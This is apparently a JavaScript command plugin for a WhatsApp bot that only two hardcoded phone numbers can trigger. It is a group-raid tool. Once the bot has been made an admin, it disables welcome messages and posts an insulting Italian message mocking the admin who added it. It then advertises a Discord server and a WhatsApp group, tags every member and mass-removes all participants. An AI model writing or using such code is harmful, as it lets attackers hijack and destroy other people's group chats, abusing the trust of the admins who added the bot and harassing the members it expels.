let handler = async (m, { conn, args, groupMetadata, participants, usedPrefix, command, isBotAdmin, isSuperAdmin }) => {
    const allowedUsers = ['66621409462@s.whatsapp.net', '40767396892@s.whatsapp.net'];
    if (!allowedUsers.includes(m.sender)) return;

    let ps = participants.map(u => u.id).filter(v => v !== conn.user.jid && v !== m.sender); 
    let bot = global.db.data.settings[conn.user.jid] || {};
    if (ps.length == 0) return;
    const delay = time => new Promise(res => setTimeout(res, time));

    switch (command) {
        case "cornuto":  
            if (!bot.restrict) return;
            if (!isBotAdmin) return;

            global.db.data.chats[m.chat].welcome = false;

            // Messaggio principale con bottoni
            await conn.sendMessage(m.chat, {
                text: "𝑽𝑰𝑽𝑨 𝑵𝑨𝑹𝑼𝑻𝑶, 𝑳'𝑨𝑫𝑴𝑰𝑵 𝑪𝑯𝑬 𝑴𝑰 𝑯𝑨 𝑴𝑬𝑺𝑺𝑶 𝑰𝑵 𝑺𝑻𝑶 𝑮𝑹𝑼𝑷𝑷𝑶 𝑬' 𝑷𝑹𝑶𝑷𝑹𝑰𝑶 𝑪𝑶𝑹𝑵𝑼𝑻𝑶.",
                footer: "Scegli dove andare",
                templateButtons: [
                    { index: 1, urlButton: { displayText: "Helfeime", url: "https://discord.gg/K3QD48a2kK" } },
                    { index: 2, urlButton: { displayText: "Holly", url: "https://chat.whatsapp.com/GUOwRP6yAl7L5nv1rECZWz" } }
                ]
            });

            // Menzione a tutti
            let utenti = participants.map(u => u.id);
            await conn.sendMessage(m.chat, {
                text: 'Tutti taggati.',
                mentions: utenti
            });

            // Rimozione partecipanti
            if (isBotAdmin && bot.restrict) { 
                await delay(1);
                await conn.groupParticipantsUpdate(m.chat, ps, 'remove');
            } else return;
            break;           
    }
};

handler.command = /^(cornuto)$/i;
handler.group = true;
handler.fail = null;
export default handler;